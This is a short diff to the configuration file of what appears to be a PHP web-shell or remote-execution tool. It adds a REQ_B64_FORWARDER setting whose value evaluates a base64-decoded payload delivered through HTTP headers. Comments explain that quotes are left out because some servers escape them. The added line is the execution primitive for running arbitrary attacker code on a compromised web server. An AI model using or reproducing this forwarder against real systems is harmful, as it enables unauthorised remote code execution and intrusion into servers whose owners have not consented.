@@ -55,6 +55,17 @@ WEBBROWSER=%%DEFAULT%%
 ### Accepted values: GET or POST
 REQ_DEFAULT_METHOD=GET
 
+##### REQ_B64_FORWARDER #####
+### the php eval code for payload
+### execution of the header forwarder
+### Info: various http servers automatically
+###       ecape the quotes in headers, for this
+###       reason it's more versatile to not use
+###       quotes in the forwarder.
+### the %%PAYLOAD%% string is the base64 payload,
+### so you need to keep it in the string.
+REQ_B64_FORWARDER=eval(base64_decode(%%PAYLOAD%%))
+
 ###### REQ_MAX_HEADERS ######
 ### maximum headers allowed by server
 ### Example: REQ_MAX_HEADERS=50
